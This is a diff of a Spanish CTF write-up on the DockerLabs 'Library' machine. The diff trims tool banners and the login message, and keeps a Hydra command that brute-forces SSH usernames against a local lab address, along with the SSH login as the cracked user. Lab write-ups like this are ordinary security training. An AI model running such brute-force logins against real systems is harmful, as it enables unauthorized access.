@@ -99,10 +99,7 @@ Probamos a ver si se trata de una contraseña para algún usuario del sistema po
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Library]
 └─$ hydra -L /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt -p JIF************* ssh://172.17.0.2 -t 64 -I 
-Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-27 00:15:03
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 64 tasks per 1 server, overall 64 tasks, 1000000 login tries (l:1000000/p:1), ~15625 tries per task
 [DATA] attacking ssh://172.17.0.2:22/
 [22][ssh] host: 172.17.0.2   login: c*****   password: JIF*************
@@ -114,16 +111,6 @@ Usando las credenciales, accedemos a la maquina por SSH:
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Library]
 └─$ ssh c*****@172.17.0.2
 c*****@172.17.0.2's password: 
-Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.16.8+kali-amd64 x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
-This system has been minimized by removing packages and content that are
-not required on a system that users do not log into.
-
-To restore this content, you can run the 'unminimize' command.
 c*****@5b1158daff63:~$ whoami
 c*****
 ```
